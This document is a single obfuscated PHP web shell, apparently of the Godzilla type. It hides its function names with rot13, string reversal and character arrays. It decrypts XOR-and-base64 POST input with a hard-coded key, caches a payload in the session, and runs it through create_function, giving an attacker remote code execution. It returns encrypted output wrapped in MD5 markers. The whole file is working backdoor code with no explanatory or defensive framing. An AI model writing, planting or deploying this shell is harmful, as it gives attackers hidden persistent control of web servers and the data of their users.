<?php
@call_user_func(implode('',['s','e','s','s','i','o','n','_','s','t','a','r','t']));
@set_time_limit(0);
@error_reporting(0);
function f_1a8b($d_2b9c,$k_3c0d){
    for($i=0;$i<strlen($d_2b9c);$i++) {
        $c_4d1e = $k_3c0d[$i+1&15];
        $d_2b9c[$i] = $d_2b9c[$i]^$c_4d1e;
    }
    return $d_2b9c;
}
$v_ef45=str_rot13('jbysfuryy');
$v_ab67=strrev('daolyap');
$v_cd89=hex2bin('33633665306238613963313532323461');
if (isset($_POST[$v_ef45])){
    $f_b64d = implode(array('b','a','s','e','6','4','_','d','e','c','o','d','e'));
    $d_5e2f=f_1a8b($f_b64d($_POST[$v_ef45]),$v_cd89);
    if (isset($_SESSION[$v_ab67])){
        $p_6f3g=f_1a8b($_SESSION[$v_ab67],$v_cd89);
        $s_find = 'strpos';
        if ($s_find($p_6f3g,base64_decode('Z2V0QmFzaWNzSW5mbw=='))===false){
            $p_6f3g=f_1a8b($p_6f3g,$v_cd89);
        }
        $f_ev = create_function('', $p_6f3g);
        $f_ev();
        $v_md5_h = 'md5';
        $v_md5_s = $v_md5_h($v_ef45.$v_cd89);
        echo substr($v_md5_s,0,16);
        echo base64_encode(f_1a8b(@run($d_5e2f),$v_cd89));
        echo substr($v_md5_s,16);
    }else{
        $s_find = 'strpos';
        if ($s_find($d_5e2f,base64_decode('Z2V0QmFzaWNzSW5mbw=='))!==false){
            $_SESSION[$v_ab67]=f_1a8b($d_5e2f,$v_cd89);
        }
    }
}